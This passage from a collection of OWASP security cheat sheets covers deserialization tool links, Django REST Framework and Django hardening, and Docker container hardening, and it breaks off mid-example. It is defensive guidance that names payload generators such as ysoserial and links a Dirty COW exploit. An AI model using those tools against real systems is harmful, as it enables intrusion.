testers](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)\r\n- [A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)\r\n- [Java De-serialization toolkits](https://github.com/brianwrf/hackUtils)\r\n- [Java de-serialization tool](https://github.com/frohoff/ysoserial)\r\n- [.Net payload generator](https://github.com/pwntester/ysoserial.net)\r\n- [Burp Suite extension](https://github.com/federicodotta/Java-Deserialization-Scanner/releases)\r\n- [Java secure deserialization library](https://github.com/ikkisoft/SerialKiller)\r\n- [Serianalyzer is a static bytecode analyzer for deserialization](https://github.com/mbechler/serianalyzer)\r\n- [Payload generator](https://github.com/mbechler/marshalsec)\r\n- [Android Java Deserialization Vulnerability Tester](https://github.com/modzero/modjoda)\r\n- Burp Suite Extension\r\n    - [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)\r\n    - [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)\r\n    - [Burp-ysoserial](https://github.com/summitt/burp-ysoserial)\r\n    - [SuperSerial](https://github.com/DirectDefense/SuperSerial)\r\n    - [SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)\r\n\r\n## References\r\n\r\n- [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)\r\n- [Deserialization of untrusted data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)\r\n- [Java Deserialization Attacks - German OWASP Day 2016](../assets/Deserialization_Cheat_Sheet_GOD16Deserialization.pdf)\r\n- [AppSecCali 2015 - Marshalling Pickles](http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles)\r\n- [FoxGlove Security - Vulnerability Announcement](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere)\r\n- [Java deserialization cheat sheet aimed at pen testers](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)\r\n- [A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)\r\n- [Java De-serialization toolkits](https://github.com/brianwrf/hackUtils)\r\n- [Java de-serialization tool](https://github.com/frohoff/ysoserial)\r\n- [Burp Suite extension](https://github.com/federicodotta/Java-Deserialization-Scanner/releases)\r\n- [Java secure deserialization library](https://github.com/ikkisoft/SerialKiller)\r\n- [Serianalyzer is a static bytecode analyzer for deserialization](https://github.com/mbechler/serianalyzer)\r\n- [Payload generator](https://github.com/mbechler/marshalsec)\r\n- [Android Java Deserialization Vulnerability Tester](https://github.com/modzero/modjoda)\r\n- Burp Suite Extension\r\n    - [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)\r\n    - [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)\r\n    - [Burp-ysoserial](https://github.com/summitt/burp-ysoserial)\r\n    - [SuperSerial](https://github.com/DirectDefense/SuperSerial)\r\n    - [SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)\r\n- .Net\r\n    - [Alvaro Muñoz: .NET Serialization: Detecting and defending vulnerable endpoints](https://www.youtube.com/watch?v=qDoBlLwREYk)\r\n    - [James Forshaw - Black Hat USA 2012 - Are You My Type? Breaking .net Sandboxes Through Serialization](https://www.youtube.com/watch?v=Xfbu-pQ1tIc)\r\n    - [Jonathan Birch BlueHat v17 - Dangerous Contents - Securing .Net Deserialization](https://www.youtube.com/watch?v=oxlD8VWWHE8)\r\n    - [Alvaro Muñoz & Oleksandr Mirosh - Friday the 13th: Attacking JSON - AppSecUSA 2017](https://www.youtube.com/watch?v=NqHsaVhlxAQ)\r\n"
    },
    {
      "Django_REST_Framework_Cheat_Sheet.md": "# Django REST Framework (DRF) Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis *Cheat sheet* intends to provide quick basic Django REST Framework security tips for developers.\r\n\r\nThe Django REST framework abstracts developers from quite a bit of tedious work and provides the means to build APIs quickly and with ease using Django. New developers, those unfamiliar with the inner workings of Django, likely need a basic set of guidelines to secure fundamental aspects of their application. The intended purpose of this doc is to be that guide.\r\n\r\n## Settings\r\n\r\nAll the Django REST Framework (DRF) configuration is done under the\r\nnamespace REST_FRAMEWORK, usually in the settings.py file. From a security perspective, the most relevant ones are:\r\n\r\n### DEFAULT_AUTHENTICATION_CLASSES\r\n\r\nA list of authentication classes that determines the default set of authenticators used when accessing the request.user or request.auth properties. In other words, what classes should be used to identify which user is authenticated.\r\n\r\nDefaults are 'rest_framework.authentication.SessionAuthentication', 'rest_framework.authentication.BasicAuthentication', that means that by default it checks the session and basic authentication for the user.\r\n\r\n### DEFAULT_PERMISSION_CLASSES\r\n\r\nA list of permission classes that determines the default set of permissions checked at the start of a view.\r\n\r\nPermission must be granted by every class in the list. Default is 'rest_framework.permissions.AllowAny'18, that means that by **default every view allows access to everybody.**\r\n\r\n### DEFAULT_THROTTLE_CLASSES\r\n\r\nA list of throttle classes that determines the default set of throttles checked at the start of a view.\r\n**Default is empty**, that means that by default there is no throttling in place.\r\n\r\n### DEFAULT_PAGINATION_CLASS\r\n\r\nThe default class to use for queryset pagination. **Pagination is disabled by default.** Lack of proper pagination could lead to Denial of Service (DoS) in cases where there’s a lot of data.\r\n\r\n## OWASP API Security Top 10\r\n\r\nThe [OWASP API Security Top 10](https://owasp.org/www-project-api-security/) is a list of the most critical security risks for APIs, developed by the [Open Web Application Security Project (OWASP)](https://owasp.org/). It is intended to help organizations identify and prioritize the most significant risks to their APIs, so that they can implement appropriate controls to mitigate those risks.\r\n\r\nThis section is based on this. Your approach to securing your web API should be to start at the top threat A1 below and work down, this will ensure that any time spent on security will be spent most effectively spent and cover the top threats first and lesser threats afterwards. After covering the top 10 it is generally advisable to assess for other threats or get a professionally completed Penetration Test.\r\n\r\n### API1:2019 Broken Object Level Authorization\r\n\r\nWhen using object-level permissions:\r\n\r\nDO: Validate that the object can be accessed by the user using the method `.check_object_permissions(request, obj)`. Example:\r\n\r\n```python\r\ndef get_object(self):\r\n    obj = get_object_or_404(self.get_queryset(), pk=self.kwargs[\"pk\"])\r\n    self.check_object_permissions(self.request, obj)\r\n    return obj\r\n```\r\n\r\nDO NOT: Override the method `get_object()` without checking if the request should have access to that object.\r\n\r\n### API2:2019 Broken User Authentication\r\n\r\nDO: Use the setting value DEFAULT_AUTHENTICATION_CLASSES with the correct classes for your project.\r\n\r\nDO: Have authentication on every non-public API endpoint.\r\n\r\nDO NOT: Overwrite the authentication class on a class-based (variable `authentication_classes`) or function-based (decorator `authentication_classes`) view unless you are confident about the change and understand the impact.\r\n\r\n### API3:2019 Excessive Data Exposure\r\n\r\nDO: Review the serializer and the information you are displaying.\r\n\r\nIf the serializer is inheriting from ModelSerializer DO NOT use the exclude Meta property.\r\n\r\nDO NOT: Display more information that the minimum required.\r\n\r\n### API4:2019 Lack of Resources & Rate Limiting\r\n\r\nDO: Configure the setting DEFAULT_THROTTLE_CLASSES.\r\n\r\nDO NOT: Overwrite the throttle class on a class-based (variable `throttle_classes`) or function-based (decorator `throttle_classes`) view unless you are confident about the change and understand the impact.\r\n\r\nEXTRA: If possible rate limiting should also be done with a WAF or similar. DRF should be the last layer of rate limiting.\r\n\r\n### API5:2019 Broken Function Level Authorization\r\n\r\nDO: Change the default value (`'rest_framework.permissions.AllowAny'`) of DEFAULT_PERMISSION_CLASSES.\r\n\r\nDO NOT: Use `rest_framework.permissions.AllowAny` except for public API endpoints.\r\n\r\nDO: Use the setting value DEFAULT_PERMISSION_CLASSES with the correct classes for your project.\r\n\r\nDO NOT: Overwrite the authorization class on a class-based (variable `permission_classes`) or function-based (decorator `permission_classes`) view unless you are confident about the change and understand the impact.\r\n\r\n### API6:2019 Mass Assignment\r\n\r\nWhen using ModelForms:\r\n\r\nDO: Use Meta.fields (allow list approach).\r\n\r\nDO NOT: Use Meta.exclude (block list approach).\r\n\r\nDO NOT: Use `ModelForms.Meta.fields = \"__all__\"`\r\n\r\n### API7:2019 Security Misconfiguration\r\n\r\nDO: Setup Django settings `DEBUG` and `DEBUG_PROPAGATE_EXCEPTIONS` to False.\r\n\r\nDO: Setup Django setting `SECRET_KEY` to a random value. Never hardcode secrets.\r\n\r\nDO: Have a repeatable hardening process leading to fast and easy deployment of a properly locked down environment.\r\n\r\nDO: Have an automated process to continuously assess the effectiveness of the configuration and settings in all environments.\r\n\r\nDO: Ensure API can only be accessed by the specified HTTP verbs. All other HTTP verbs should be disabled.\r\n\r\nDO NOT: Use default passwords\r\n\r\n### API8:2019 Injection\r\n\r\nDO: Validate, filter, and sanitize all client-provided data, or other data coming from integrated systems.\r\n\r\n#### SQLi\r\n\r\nDO: Use parametrized queries.\r\n\r\nTRY NOT TO: Use dangerous methods like `raw()`, `extra()` and custom SQL (via `cursor.execute()`).\r\n\r\nDO NOT: Add user input to dangerous methods (`raw()`, `extra()`, `cursor.execute()`).\r\n\r\n#### RCE\r\n\r\nDO NOT: Add user input to dangerous methods (`eval()`, `exec()` and `execfile()`).\r\n\r\nDO NOT: Load user-controlled pickle files. This includes the pandas method `pandas.read_pickle()`.\r\n\r\nDO NOT: Load user-controlled YAML files using the method `load()`.\r\n\r\nDO: Use the `Loader=yaml.SafeLoader` for YAML files.\r\n\r\n### API9:2019 Improper Assets Management\r\n\r\nDO: Have an inventory of all API hosts and document important aspects of each one of them, focusing on the API environment (e.g., production, staging, test, development), who should have network access to the host (e.g., public, internal, partners) and the API version.\r\n\r\nDO: Document all aspects of your API such as authentication, errors, redirects, rate limiting, cross-origin resource sharing (CORS) policy and endpoints, including their parameters, requests, and responses.\r\n\r\n### API10:2019 Insufficient Logging & Monitoring\r\n\r\nDO: Log all failed authentication attempts, denied access, and input validation errors with sufficient user context to identify suspicious or malicious accounts.\r\n\r\nDO: Create logs in a format suited to be consumed by a log management solution and should include enough detail to identify the malicious actor.\r\n\r\nDO: Handle logs as sensitive data, and their integrity should be guaranteed at rest and transit.\r\n\r\nDO: Configure a monitoring system to continuously monitor the infrastructure, network, and the API functioning.\r\n\r\nDO: Use a Security Information and Event Management (SIEM) system to aggregate and manage logs from all components of the API stack and hosts.\r\n\r\nDO: Configure custom dashboards and alerts, enabling suspicious activities to be detected and responded to earlier.\r\n\r\nDO: Establish effective monitoring and alerting so suspicious activities are detected and responded to in a timely fashion.\r\n\r\nDO NOT: Log generic error messages such as: Log.Error(\"Error was thrown\"); rather log the stack trace, error message and user ID who caused the error.\r\n\r\nDO NOT: Log sensitive data such as user's passwords, API Tokens or PII.\r\n\r\n## Other security Risks\r\n\r\nBelow is a list of security risks for APIs not discussed in the OWASP API Security Top 10.\r\n\r\n### Business Logic Bugs\r\n\r\nAny application in any technology can contain business logic errors that result in security bugs. Business logic bugs are difficult to impossible to detect using automated tools. The best ways to prevent business logic security bugs are to do threat model, security design review, code review, pair program and write unit tests.\r\n\r\n### Secret Management\r\n\r\nSecrets should never be hardcoded. The best practice is to use a Secret Manager. For more information review OWASP [Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)\r\n\r\n## Updating Django and DRF and Having a Process for Updating Dependencies\r\n\r\nAn concern with every application, including Python applications, is that dependencies can have vulnerabilities.\r\n\r\nOne good practice is to audit the dependencies your project is using.\r\n\r\nIn general, it is important to have a process for updating dependencies. An example process might define three mechanisms for triggering an update of response:\r\n\r\n- Every month/quarter dependencies in general are updated.\r\n- Every week important security vulnerabilities are considered and potentially trigger an update.\r\n- In EXCEPTIONAL conditions, emergency updates may need to be applied.\r\n\r\nThe Django Security team has a information on [How Django discloses security issues](https://docs.djangoproject.com/en/4.1/internals/security/#how-django-discloses-security-issues).\r\n\r\nFinally, an important aspect when considering if a new dependency should be added or not to the project is the \"Security Health\" of the library. How often it's updated? Does it have known vulnerabilities? Does it have an active community? etc. Some tools can help with this task (E.g. [Snyk Advisor](https://snyk.io/advisor/python))\r\n\r\n## SAST Tools\r\n\r\nThere are several excellent open-source static analysis security tools for Python that are worth considering, including:\r\n\r\nBandit – [Bandit](https://bandit.readthedocs.io/en/latest/) is a tool designed to find common security issues in Python. To do this Bandit processes each file, builds an Abstract Syntax Tree (AST) from it, and runs appropriate plugins against the AST nodes. Once Bandit has finished scanning all the files it generates a report. Bandit was originally developed within the OpenStack Security Project and later rehomed to PyCQA.\r\n\r\nSemgrep – [Semgrep](https://semgrep.dev/) is a fast, open-source, static analysis engine for finding bugs, detecting vulnerabilities in third-party dependencies, and enforcing code standards. Developed by “Return To Corporation” (usually referred to as r2c) and open-source contributors. It works based on rules, which can focus on security, language best practices, or something else. Creating a rule is easy and semgrep is very powerful. For Django there are 29 rules.\r\n\r\nPyCharm Security – [Pycharm-security](https://pycharm-security.readthedocs.io/en/latest/index.html) is a plugin for PyCharm, or JetBrains IDEs with the Python plugin. The plugin looks at Python code for common security vulnerabilities and suggests fixes. It can also be executed from a Docker container. It has about 40 checks and some are Django specific.\r\n\r\n## Related Articles and References\r\n\r\n- [Django REST Framework (DRF) Secure Code Guidelines](https://openaccess.uoc.edu/handle/10609/147246)\r\n- [Django’s security policies](https://docs.djangoproject.com/en/4.1/internals/security/)\r\n- [Security in Django](https://docs.djangoproject.com/en/4.1/topics/security/)\r\n"
    },
    {
      "Django_Security_Cheat_Sheet.md": "# Django Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe Django framework is a powerful Python web framework, and it comes with built-in security features that can be used out-of-the-box to prevent common web vulnerabilities. This cheat sheet lists actions and security tips developers can take to develop secure Django applications. It aims to cover common vulnerabilities to increase the security posture of your Django application. Each item has a brief explanation and relevant code samples that are specific to the Django environment.\r\n\r\nThe Django framework provides some built-in security features that aim to be secure-by-default. These features are also flexible to empower a developer to re-use components for complex use-cases. This opens up scenarios where developers unfamiliar with the inner workings of the components can configure them in an insecure way. This cheat sheet aims to enumerate some such use cases.\r\n\r\n## General Recommendations\r\n\r\n- Always keep Django and your application's dependencies up-to-date to keep up with security vulnerabilities.\r\n- Ensure that the application is never in `DEBUG` mode in a production environment. Never run `DEBUG = True` in production.\r\n- Use packages like [`django_ratelimit`](https://django-ratelimit.readthedocs.io/en/stable/) or [`django-axes`](https://django-axes.readthedocs.io/en/latest/index.html) to prevent brute-force attacks.\r\n\r\n## Authentication\r\n\r\n- Use `django.contrib.auth` app for views and forms for user authentication operations such as login, logout, password change, etc. Include the module and its dependencies `django.contrib.contenttypes` and `django.contrib.sessions` in the `INSTALLED_APPS` setting in the `settings.py` file.\r\n\r\n  ```python\r\n  INSTALLED_APPS = [\r\n      # ...\r\n      'django.contrib.auth',\r\n      'django.contrib.contenttypes',\r\n      'django.contrib.sessions',\r\n      # ...\r\n  ]\r\n  ```\r\n\r\n- Use the `@login_required` decorator to ensure that only authenticated users can access a view. The sample code below illustrates usage of `@login_required`.\r\n\r\n  ```python\r\n  from django.contrib.auth.decorators import login_required\r\n\r\n  # User is redirected to default login page if not authenticated.\r\n  @login_required\r\n  def my_view(request):\r\n    # Your view logic\r\n\r\n  # User is redirected to custom '/login-page/' if not authenticated.\r\n  @login_required(login_url='/login-page/')\r\n  def my_view(request):\r\n    # Your view logic\r\n  ```\r\n\r\n- Use password validators for enforcing password policies. Add or update the `AUTH_PASSWORD_VALIDATORS` setting in the `settings.py` file to include specific validators required by your application.\r\n\r\n  ```python\r\n  AUTH_PASSWORD_VALIDATORS = [\r\n    {\r\n      # Checks the similarity between the password and a set of attributes of the user.\r\n      'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\r\n      'OPTIONS': {\r\n        'user_attributes': ('username', 'email', 'first_name', 'last_name'),\r\n        'max_similarity': 0.7,\r\n      }\r\n    },\r\n    {\r\n      # Checks whether the password meets a minimum length.\r\n      'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\r\n      'OPTIONS': {\r\n        'min_length': 8,\r\n      }\r\n    },\r\n    {\r\n      # Checks whether the password occurs in a list of common passwords\r\n      'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\r\n    },\r\n    {\r\n      # Checks whether the password isn’t entirely numeric\r\n      'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\r\n    }\r\n  ]\r\n  ```\r\n\r\n- Store passwords using `make-password` utility function to hash a plain-text password.\r\n\r\n  ```python\r\n  from django.contrib.auth.hashers import make_password\r\n  #...\r\n  hashed_pwd = make_password('plaintext_password')\r\n  ```\r\n\r\n- Check a plaintext password against a hashed password by using the  `check-password` utility function.\r\n\r\n  ```python\r\n  from django.contrib.auth.hashers import check_password\r\n  #...\r\n  plain_pwd = 'plaintext_password'\r\n  hashed_pwd = 'hashed_password_from_database'\r\n\r\n  if check_password(plain_pwd, hashed_pwd):\r\n    print(\"The password is correct.\")\r\n  else:\r\n    print(\"The password is incorrect.\")\r\n  ```\r\n\r\n## Key Management\r\n\r\nThe `SECRET_KEY` parameter in settings.py is used for cryptographic signing and should be kept confidential. Consider the following recommendations:\r\n\r\n- Generate a key at least 50 characters or more, containing a mix of letters, digits, and symbols.\r\n- Ensure that the `SECRET_KEY` is generated using a strong random generator, such as `get_random_secret_key()` function in Django.\r\n- Avoid hard coding the `SECRET_KEY` value in settings.py or any other location. Consider storing the key-value in environment variables or secrets managers.\r\n\r\n  ```python\r\n  import os\r\n  SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')\r\n  ```\r\n\r\n- Regularly rotate the key, keeping in mind that this action can invalidate sessions, password reset tokens, etc. Rotate the key immediatley it if it ever gets exposed.\r\n\r\n## Headers\r\n\r\nInclude the `django.middleware.security.SecurityMiddleware` module in the `MIDDLEWARE` setting in your project's `settings.py` to add security-related headers to your responses. This module is used to set the following parameters:\r\n\r\n- `SECURE_CONTENT_TYPE_NOSNIFF`: Set this key to `True`. Protects against MIME type sniffing attacks by enabling the header `X-Content-Type-Options: nosniff`.\r\n- `SECURE_BROWSER_XSS_FILTER`: Set this key to `True`. Enables the browser’s XSS filter by setting the header `X-XSS-Protection: 1; mode=block`.\r\n- `SECURE_HSTS_SECONDS`: Ensures the site is only accessible via HTTPS.\r\n\r\nInclude the `django.middleware.clickjacking.XFrameOptionsMiddleware` module in the `MIDDLEWARE` setting in your project's `settings.py` (This module should be listed after the `django.middleware.security.SecurityMiddleware` module as ordering is important). This module is used to set the following parameters:\r\n\r\n- `X_FRAME_OPTIONS`: Set this key to to 'DENY' or 'SAMEORIGIN'. This setting adds the `X-Frame-Options` header to all HTTP responses. This protects against clickjacking attacks.\r\n\r\n## Cookies\r\n\r\n- `SESSION_COOKIE_SECURE`: Set this key to `True` in the `settings.py` file. This will send the session cookie over secure (HTTPS) connections only.\r\n- `CSRF_COOKIE_SECURE`: Set this key to `True` in the `settings.py` file. This will ensure that the CSRF cookie is sent over secure connections only.\r\n- Whenever you set a custom cookie in a view using the `HttpResponse.set_cookie()` method, make sure to set its secure parameter to `True`.\r\n\r\n  ```python\r\n  response = HttpResponse(\"Some response\")\r\n  response.set_cookie('my_cookie', 'cookie_value', secure=True)\r\n  ```\r\n\r\n## Cross Site Request Forgery (CSRF)\r\n\r\n- Include the `django.middleware.csrf.CsrfViewMiddleware` module in the `MIDDLEWARE` setting in your project's `settings.py` to add CSRF related headers to your responses.\r\n- In forms use the `{% csrf_token %}` template tag to include the CSRF token. A sample is shown below.\r\n\r\n  ```html\r\n  <form method=\"post\">\r\n      {% csrf_token %}\r\n      <!-- Your form fields here -->\r\n  </form>\r\n  ```\r\n\r\n- For AJAX calls, the CSRF token for the request has to be extracted prior to being used in the the AJAX call.  \r\n- Additional recommendations and controls can be found at Django's [Cross Site Request Forgery protection](https://docs.djangoproject.com/en/3.2/ref/csrf/) documentation.\r\n\r\n## Cross Site Scripting (XSS)\r\n\r\nThe recommendations in this section are in addition to XSS recommendations already mentioned previously.\r\n\r\n- Use the built-in template system to render templates in Django. Refer to Django's [Automatic HTML escaping](https://docs.djangoproject.com/en/3.2/ref/templates/language/#automatic-html-escaping) documentation to learn more.\r\n- Avoid using `safe`, `mark_safe`, or `json_script` filters for disabling Django's automatic template escaping. The equivalent function in Python is the `make_safe()` function. Refer to the [json_script](https://docs.djangoproject.com/en/3.2/ref/templates/builtins/#json-script0) template filter documentation to learn more.\r\n- Refer to Django's [Cross Site Scripting (XSS) protection](https://docs.djangoproject.com/en/3.2/topics/security/#cross-site-scripting-xss-protection) documentation to learn more.\r\n\r\n## HTTPS\r\n\r\n- Include the `django.middleware.security.SecurityMiddleware` module in the `MIDDLEWARE` setting in your project's `settings.py` if not already added.\r\n- Set the `SECURE_SSL_REDIRECT = True` in the `settings.py` file to ensure that all communication is over HTTPS. This will redirect any HTTP requests automatically to HTTPS. This is also a 301 (permanent) redirect, so your browser will remember the redirect for subsequent requests.\r\n- If your Django application is behind a proxy or load balancer, set the `SECURE_PROXY_SSL_HEADER` setting to `TRUE` so that Django can detect the original request's protocol. For futher details refer to [SECURE_PROXY_SSL_HEADER documentation](https://docs.djangoproject.com/en/3.2/ref/settings/#secure-proxy-ssl-header).\r\n\r\n## Admin panel URL\r\n\r\nIt is advisable to modify the default URL leading to the admin panel (example.com/admin/), in order to slightly increase the difficulty for automated attacks. Here’s how to do it:\r\n\r\nIn the default app folder within your project, locate the `urls.py` file managing the top-level URLs. Within the file, modify the `urlpatterns` variable, a list, so that the URL leading to `admin.site.urls` is different from \"admin/\". This approach adds an extra layer of security by obscuring the common endpoint used for administrative access.\r\n\r\n## References\r\n\r\nAdditional documentation -\r\n\r\n- [Clickjacking Protection](https://docs.djangoproject.com/en/3.2/topics/security/#clickjacking-protection)\r\n- [Security Middleware](https://docs.djangoproject.com/en/3.2/topics/security/#module-django.middleware.security)\r\n"
    },
    {
      "Docker_Security_Cheat_Sheet.md": "# Docker Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nDocker is the most popular containerization technology. Upon proper use, it can increase the level of security (in comparison to running applications directly on the host). On the other hand, some misconfigurations can lead to downgrade the level of security or even introduce new vulnerabilities.\r\n\r\nThe aim of this cheat sheet is to provide an easy to use list of common security mistakes and good practices that will help you secure your Docker containers.\r\n\r\n## Rules\r\n\r\n### RULE \\#0 - Keep Host and Docker up to date\r\n\r\nTo prevent from known, container escapes vulnerabilities, which typically end in escalating to root/administrator privileges, patching Docker Engine and Docker Machine is crucial.\r\n\r\nIn addition, containers (unlike in virtual machines) share the kernel with the host, therefore kernel exploits executed inside the container will directly hit host kernel. For example, kernel privilege escalation exploit ([like Dirty COW](https://github.com/scumjr/dirtycow-vdso)) executed inside a well-insulated container will result in root access in a host.\r\n\r\n### RULE \\#1 - Do not expose the Docker daemon socket (even to the containers)\r\n\r\nDocker socket */var/run/docker.sock* is the UNIX socket that Docker is listening to. This is the primary entry point for the Docker API. The owner of this socket is root. Giving someone access to it is equivalent to giving unrestricted root access to your host.\r\n\r\n**Do not enable *tcp* Docker daemon socket.** If you are running docker daemon with `-H tcp://0.0.0.0:XXX` or similar you are exposing un-encrypted and unauthenticated direct access to the Docker daemon, if the host is internet connected this means the docker daemon on your computer can be used by anyone from the public internet.\r\nIf you really, **really** have to do this, you should secure it. Check how to do this [following Docker official documentation](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option).\r\n\r\n**Do not expose */var/run/docker.sock* to other containers**. If you are running your docker image with `-v /var/run/docker.sock://var/run/docker.sock` or similar, you should change it. Remember that mounting the socket read-only is not a solution but only makes it harder to exploit. Equivalent in the docker-compose file is something like this:\r\n\r\n```yaml\r\nvolumes:\r\n- \"/var/run/docker.sock:/var/run/docker.sock\"\r\n```\r\n\r\n### RULE \\#2 - Set a user\r\n\r\nConfiguring the container to use an unprivileged user is the best way to prevent privilege escalation attacks. This can be accomplished in three different ways as follows:\r\n\r\n1. During runtime using `-u` option of `docker run` command e.g.:\r\n\r\n    ```bash\r\n    docker run -u 4000 alpine\r\n    ```\r\n\r\n2. During build time. Simple add user in Dockerfile and use it. For example:\r\n\r\n    ```docker\r\n    FROM alpine\r\n    RUN groupadd -r myuser && useradd -r -g myuser myuser\r\n    <HERE DO WHAT YOU HAVE TO DO AS A ROOT USER LIKE INSTALLING PACKAGES ETC.>\r\n    USER myuser\r\n    ```\r\n\r\n3. Enable user namespace support (`--userns-remap=default`) in [Docker daemon](https://docs.docker.com/engine/security/userns-remap/#enable-userns-remap-on-the-daemon)\r\n\r\nMore information about this topic can be found at [Docker official documentation](https://docs.docker.com/engine/security/userns-remap/)\r\n\r\nIn kubernetes, this can be configured in [Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) using `runAsNonRoot` field e.g.:\r\n\r\n```yaml\r\nkind: ...\r\napiVersion: ...\r\nmetadata:\r\n  name: ...\r\nspec:\r\n  ...\r\n  containers:\r\n  - name: ...\r\n    image: ....\r\n    securityContext:\r\n          ...\r\n          runAsNonRoot: true\r\n          ...\r\n```\r\n\r\nAs a Kubernetes cluster administrator, you can configure it using [Pod Security Policies](https://kubernetes.io/docs/concepts/policy/pod-security-policy/).\r\n\r\n### RULE \\#3 - Limit capabilities (Grant only specific capabilities, needed by a container)\r\n\r\n[Linux kernel capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html) are a set of privileges that can be used by privileged. Docker, by default, runs with only a  subset of capabilities.\r\nYou can change it and drop some capabilities (using `--cap-drop`) to harden your docker containers, or add some capabilities (using `--cap-add`) if needed.\r\nRemember not to run containers with the `--privileged` flag - this will add ALL Linux kernel capabilities to the container.\r\n\r\nThe most secure setup is to drop all capabilities `--cap-drop all` and then add only required ones. For example:\r\n\r\n```bash\r\ndocker run --cap-drop all --cap-add CHOWN alpine\r\n```\r\n\r\n**And remember: Do not run containers with the *--privileged* flag!!!**\r\n\r\nIn kubernetes this can be configured in [Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) using `capabilities` field e.g.:\r\n\r\n```yaml\r\nkind: ...\r\napiVersion: ...\r\nmetadata:\r\n  name: ...\r\nspec:\r\n  ...\r\n  containers:\r\n  - name: ...\r\n    image: ....\r\n    securityContext:\r\n          ...\r\n          capabilities:\r\n            drop:\r\n              - all\r\n            add:\r\n              - CHOWN\r\n          ...\r\n```\r\n\r\nAs a Kubernetes cluster administrator, you can configure it using [Pod Security Policies](https://kubernetes.io/docs/concepts/policy/pod-security-policy/).\r\n\r\n### RULE \\#4 - Add –no-new-privileges flag\r\n\r\nAlways run your docker images with `--security-opt=no-new-privileges` in order to prevent escalate privileges using `setuid` or `setgid` binaries.\r\n\r\nIn kubernetes, this can be configured in [Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) using `allowPrivilegeEscalation` field e.g.:\r\n\r\n```yaml\r\nkind: ...\r\napiVersion: ...\r\nmetadata:\r\n  name: ...\r\nspec:\r\n  ...\r\n  containers:\r\n  - name: ...\r\n    image: ....\r\n    securityContext:\r\n          ...\r\n          allowPrivilegeEscalation: false\r\n          ...\r\n```\r\n\r\nAs a Kubernetes cluster administrator, you can refer to Kubernetes documentation to configure it using [Pod Security Policies](https://kubernetes.io/docs/concepts/policy/pod-security-policy/).\r\n\r\n### RULE \\#5 - Disable inter-container communication (--icc=false)\r\n\r\nBy default inter-container communication (icc) is enabled - it means that all containers can talk with each other (using [`docker0` bridged network](https://docs.docker.com/v17.09/engine/userguide/networking/default_network/container-communication/#communication-between-containers)).\r\nThis can be disabled by running docker daemon with `--icc=false` flag.\r\nIf icc is disabled (icc=false) it is required to tell which containers can communicate using --link=CONTAINER_NAME_or_ID:ALIAS option.\r\nSee more in [Docker documentation - container communication](https://docs.docker.com/v17.09/engine/userguide/networking/default_network/container-communication/#communication-between-containers)\r\n\r\nIn Kubernetes [Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/) can be used for it.\r\n\r\n### RULE \\#6 - Use Linux Security Module (seccomp, AppArmor, or SELinux)\r\n\r\n**First of all, do not disable default security profile!**\r\n\r\nConsider using security profile like [seccomp](https://docs.docker.com/engine/security/seccomp/) or [AppArmor](https://docs.docker.com/engine/security/apparmor/).\r\n\r\nInstructions how to do this inside Kubernetes can be found at [Security Context documentation](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) and in [Kubernetes API documentation](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#securitycontext-v1-core)\r\n\r\n### RULE \\#7 - Limit resources (memory, CPU, file descriptors, processes, restarts)\r\n\r\nThe best way to avoid DoS attacks is by limiting resources. You can limit [memory](https://docs.docker.com/config/containers/resource_constraints/#memory), [CPU](https://docs.docker.com/config/containers/resource_constraints/#cpu), maximum number of restarts (`--restart=on-failure:<number_of_restarts>`), maximum number of file descriptors (`--ulimit nofile=<number>`) and maximum number of processes (`--ulimit nproc=<number>`).\r\n\r\n[Check documentation for more details about ulimits](https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit)\r\n\r\nYou can also do this inside Kubernetes: [Assign Memory Resources to Containers and Pods](https://kubernetes.io/docs/tasks/configure-pod-container/assign-memory-resource/), [Assign CPU Resources to Containers and Pods](https://kubernetes.io/docs/tasks/configure-pod-container/assign-cpu-resource/) and [Assign Extended Resources to a Container\r\n](https://kubernetes.io/docs/tasks/configure-pod-container/extended-resource/)\r\n\r\n### RULE \\#8 - Set filesystem and volumes to read-only\r\n\r\n**Run containers with a read-only filesystem** using `--read-only` flag. For example:\r\n\r\n```bash\r\ndocker run --read-only alpine sh -c 'echo \"whatever\" > /tmp'\r\n```\r\n\r\nIf an application inside a container has to save something temporarily, combine `--read-only` flag with `--tmpfs` like this:\r\n\r\n```bash\r\ndocker run --read-only --tmpfs /tmp alpine sh -c 'echo \"whatever\" > /tmp/file'\r\n```\r\n\r\nEquivalent in the docker-compose file will be:\r\n\r\n```yaml\r\nversion: \"3\"\r\nservices:\r\n  alpine:\r\n    image: 